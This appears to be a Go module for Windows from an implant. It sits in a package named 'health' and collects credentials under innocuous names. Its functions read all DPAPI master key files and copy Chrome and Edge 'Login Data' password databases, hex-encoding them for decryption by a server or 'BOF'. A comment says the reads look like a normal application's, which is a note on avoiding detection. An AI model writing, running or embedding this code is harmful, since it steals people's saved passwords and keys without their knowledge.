//go:build windows && amd64

package health

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ExtractDPAPIMasterKeys 从 %APPDATA%\Microsoft\Protect\ 提取 DPAPI Master Key。
// 这些 key 可用于解密浏览器保存的密码、WiFi 密码等。
// 行为：纯文件读取，与正常应用无区别。
func ExtractDPAPIMasterKeys() (*HealthResult, error) {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	appData := os.Getenv("APPDATA")
	if appData == "" {
		result.Error = "APPDATA not set"
		return result, nil
	}

	protectDir := filepath.Join(appData, "Microsoft", "Protect")
	entries, err := os.ReadDir(protectDir)
	if err != nil {
		result.Error = fmt.Sprintf("read Protect dir: %v", err)
		return result, nil
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		// Each subdirectory is a GUID containing master keys
		guidDir := filepath.Join(protectDir, entry.Name())
		files, err := os.ReadDir(guidDir)
		if err != nil {
			continue
		}
		for _, f := range files {
			if f.IsDir() {
				continue
			}
			keyPath := filepath.Join(guidDir, f.Name())
			data, err := os.ReadFile(keyPath)
			if err != nil {
				continue
			}
			result.Credentials = append(result.Credentials, HealthInfo{
				Username:   f.Name(),
				Domain:     entry.Name(),
				TicketData: hex.EncodeToString(data),
				SourceType: "dpapi",
			})
		}
	}

	if len(result.Credentials) == 0 {
		return result, nil
	}

	return result, nil
}

// ExtractBrowserCredentials 从 Chrome/Edge 浏览器数据库提取保存的密码。
// 读取 Login Data (SQLite) 文件，提取 logins 表中的 username/password。
// 密码使用 DPAPI 加密，需要进一步解密。
func ExtractBrowserCredentials() (*HealthResult, error) {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		result.Error = "LOCALAPPDATA not set"
		return result, nil
	}

	browsers := map[string]string{
		"chrome": filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		"edge":   filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
	}

	for name, baseDir := range browsers {
		loginData := filepath.Join(baseDir, "Default", "Login Data")
		if _, err := os.Stat(loginData); err != nil {
			// Try all profile directories
			entries, err := os.ReadDir(baseDir)
			if err != nil {
				continue
			}
			for _, e := range entries {
				if !e.IsDir() || strings.HasPrefix(e.Name(), "System") {
					continue
				}
				profileLoginData := filepath.Join(baseDir, e.Name(), "Login Data")
				if _, err := os.Stat(profileLoginData); err == nil {
					loginData = profileLoginData
					break
				}
			}
		}

		if _, err := os.Stat(loginData); err != nil {
			continue
		}

		// Read the SQLite file — passwords are DPAPI-encrypted blobs
		// We extract the raw data; server-side or BOF can decrypt via CryptUnprotectData
		data, err := os.ReadFile(loginData)
		if err != nil {
			continue
		}

		result.Credentials = append(result.Credentials, HealthInfo{
			Username:   name,
			Domain:     loginData,
			TicketData: hex.EncodeToString(data[:min(len(data), 8192)]), // First 8KB header
			SourceType: "browser",
		})
	}

	return result, nil
}
